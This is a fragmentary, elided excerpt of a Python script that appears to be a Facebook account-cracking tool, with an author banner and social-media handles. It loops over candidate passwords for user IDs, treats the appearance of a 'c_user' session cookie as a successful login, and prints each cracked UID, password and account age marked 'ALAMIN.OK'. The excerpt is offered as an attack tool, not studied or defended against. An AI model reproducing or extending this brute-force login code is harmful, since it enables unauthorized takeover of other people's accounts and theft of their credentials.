...
\033[1;32m---------------------------------------------------------
\033[1;32m  AUTHOR    : RAFI CHOWDHUARY
\033[1;32m  GITHUB    : CYBER-RAFI
\033[1;32m  FACEBOOK  : RAFI CHOWDHUARY
...
def menu():
	...
	if _____ALAMIN_____ in ['4']:
		os.system("xdg-open https://www.facebook.com/monayem.ahmed.16?mibextid=ZbWKwL")
    ...
    try:
        for ps in pwx:
        	...
        	if 'c_user' in log_cookies:
        	    ...
        	    cid = coki[151:166]
        	    print ('')
        	    print('\033[1;92m[\033[1;92mALAMIN.OK\033[1;92m] \033[1;92m'+uid+' | '+ps+ '\033[1;91m = \033[1;96m '+tahunng(cid))
